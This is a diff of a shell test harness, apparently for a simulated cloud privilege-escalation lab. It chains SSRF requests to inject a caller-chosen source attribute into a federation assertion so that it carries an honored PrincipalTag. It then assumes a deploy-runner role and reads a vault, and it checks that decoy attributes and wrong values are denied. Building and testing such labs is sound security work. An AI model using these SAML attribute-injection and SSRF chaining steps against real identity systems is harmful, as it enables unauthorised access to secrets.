@@ -23,13 +23,8 @@ except Exception:
 # nested quoting cannot corrupt the payload. Each prints a single base64url query value.
 p_ent()   { python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"user":"svc-deploy","password":sys.argv[1],"group":sys.argv[2]},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
 p_assert(){ python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":sys.argv[2],"attributes":{}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
-_PT="https://aws.amazon.com/SAML/Attributes/PrincipalTag:"
-# smuggle the honored PrincipalTag attribute (default family = principal-tag)
-p_tag()   { python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{sys.argv[4]+sys.argv[2]:sys.argv[3]}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3" "$_PT"; }
-# spray MULTIPLE PrincipalTag attributes -> strict schema rejects
-p_spray() { python3 -c 'import base64,json,sys;pt,t,v=sys.argv[4],sys.argv[2],sys.argv[3];print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{pt+t:v,pt+"admin":v,pt+"environment":v}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3" "$_PT"; }
-# put the value under a DECOY attribute (not a PrincipalTag) -> ignored -> tag-less session
-p_decoy() { python3 -c 'import base64,json,sys;v=sys.argv[2];print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{"department":v,"custom:deploy":v}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
+# inject a caller source attribute (the IdP claim rule emits the mapped tag): attributes={source:value}
+p_inject(){ python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"entitlement":sys.argv[1],"role":"cloud-operator","attributes":{sys.argv[2]:sys.argv[3]}},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2" "$3"; }
 p_assume(){ python3 -c 'import base64,json,sys;print(base64.urlsafe_b64encode(json.dumps({"session":sys.argv[1],"role":sys.argv[2]},separators=(",",":")).encode()).decode().rstrip("="))' "$1" "$2"; }
 # p_run cred pass_role action [input-json]  — input is an OPTIONAL 4th arg (a JSON object literal)
 p_run()   { python3 -c 'import base64,json,sys
@@ -61,9 +56,12 @@ a0="$(ssrf "$IDP/idp/assert?p=$(p_assert "$ent" cloud-operator)" | jkey assertio
 sess0="$(ssrf "$IAM/iam/session?assertion=${a0}" | jkey session)"
 desc="$(ssrf "$IAM/iam/describe?session=${sess0}")"
 tag="$(printf '%s' "$desc" | python3 -c 'import sys,json;c=json.load(sys.stdin)["principals"]["deploy-runner"]["trust_policy"]["Condition"]["StringEquals"];print(next(iter(c)).split("/")[-1])')"
-# the value is DISCOVERED: the project code published as an attribute of the entitled directory group
-tagval="$(ssrf "$DIR/dir/groups?name=federation-eligible" | python3 -c 'import sys,json;a=json.load(sys.stdin)["attributes"];print(next(iter(a.values())))')"
-a1="$(ssrf "$IDP/idp/assert?p=$(p_tag "$ent" "$tag" "$tagval")" | jkey assertion)"
+oteam="$(ssrf "$DIR/dir/groups?name=federation-eligible" | jkey owner_team)"
+# INJECTION POINT: the source attr whose claim rule emits the honored tag
+src="$(ssrf "$IDP/idp/claim-rules" | python3 -c 'import sys,json;print(next(r["source"] for r in json.load(sys.stdin)["rules"] if r["emits_tag"]==sys.argv[1]))' "$tag")"
+# VALUE: the project_code of the project owned by the entitled group's team (correlate the catalog)
+tagval="$(ssrf "$DIR/dir/projects" | python3 -c 'import sys,json;print(next(p["project_code"] for p in json.load(sys.stdin)["projects"] if p["owner_team"]==sys.argv[1]))' "$oteam")"
+a1="$(ssrf "$IDP/idp/assert?p=$(p_inject "$ent" "$src" "$tagval")" | jkey assertion)"
 sess1="$(ssrf "$IAM/iam/session?assertion=${a1}" | jkey session)"
 dr="$(ssrf "$IAM/iam/assume?p=$(p_assume "$sess1" deploy-runner)" | jkey role_credential)"
 readresp="$(ssrf "$DEP/deploy/run?p=$(p_run "$dr" infra-admin read-vault)")"
@@ -88,16 +86,19 @@ deny "P3 forged assertion (bad signature) is rejected by cloud IAM" \
 deny "P4 direct request for a privileged federation role is refused by the IdP" \
   "$(ssrf "$IDP/idp/assert?p=$(p_assert "$ent" infra-admin)")" '"assertion"'
 
-# P5 — hop 4 (THE all-nested-attributes probe): spraying every candidate tag under session_tags is
-# rejected by the strict schema (cannot brute-force which attribute is honored).
-deny "P5 all-nested-attributes spray under session_tags is schema-rejected" \
-  "$(ssrf "$IAM/iam/session?assertion=$(ssrf "$IDP/idp/assert?p=$(p_spray "$ent" "$tag" "$tagval")" | jkey assertion)")" '"session"'
+# P5 — hop 4: injecting via a DECOY source attribute (its claim rule emits a NON-honored tag) yields
+# no honored session tag, so the deploy-runner assume is denied.
+dsrc="$(ssrf "$IDP/idp/claim-rules" | python3 -c 'import sys,json;r=json.load(sys.stdin)["rules"];print(next((x["source"] for x in r if x["emits_tag"]!=sys.argv[1]),""))' "$tag")"
+sess_ds="$(ssrf "$IAM/iam/session?assertion=$(ssrf "$IDP/idp/assert?p=$(p_inject "$ent" "$dsrc" "$tagval")" | jkey assertion)" | jkey session)"
+deny "P5 injecting via a decoy source attribute (wrong claim rule) does not satisfy the condition" \
+  "$(ssrf "$IAM/iam/assume?p=$(p_assume "$sess_ds" deploy-runner)")" 'role_credential'
 
-# P5b — hop 4: the correct VALUE placed at a decoy path (top-level, not session_tags) yields a
-# tag-LESS session, so the deploy-runner assume is denied (decoy paths are ignored, not honored).
-sess_decoy="$(ssrf "$IAM/iam/session?assertion=$(ssrf "$IDP/idp/assert?p=$(p_decoy "$ent" "$tagval")" | jkey assertion)" | jkey session)"
-deny "P5b correct value at a DECOY attribute path does not tag the session (assume denied)" \
-  "$(ssrf "$IAM/iam/assume?p=$(p_assume "$sess_decoy" deploy-runner)")" 'role_credential'
+# P5b — hop 4: the honored source with a WRONG value (another project's code) fails the trust condition
+# — a uniform, generic denial (no oracle telling you the value is what's wrong).
+wrongval="$(ssrf "$DIR/dir/projects" | python3 -c 'import sys,json;print(next(p["project_code"] for p in json.load(sys.stdin)["projects"] if p["owner_team"]!=sys.argv[1]))' "$oteam")"
+sess_wv="$(ssrf "$IAM/iam/session?assertion=$(ssrf "$IDP/idp/assert?p=$(p_inject "$ent" "$src" "$wrongval")" | jkey assertion)" | jkey session)"
+deny "P5b honored source with a WRONG project code fails the trust condition (uniform denial)" \
+  "$(ssrf "$IAM/iam/assume?p=$(p_assume "$sess_wv" deploy-runner)")" 'role_credential'
 
 # P6 — hop 5: explicit deny — even with a fully-tagged session, assuming admin directly is refused.
 deny "P6 direct assume of infra-admin (explicit deny) is refused" \
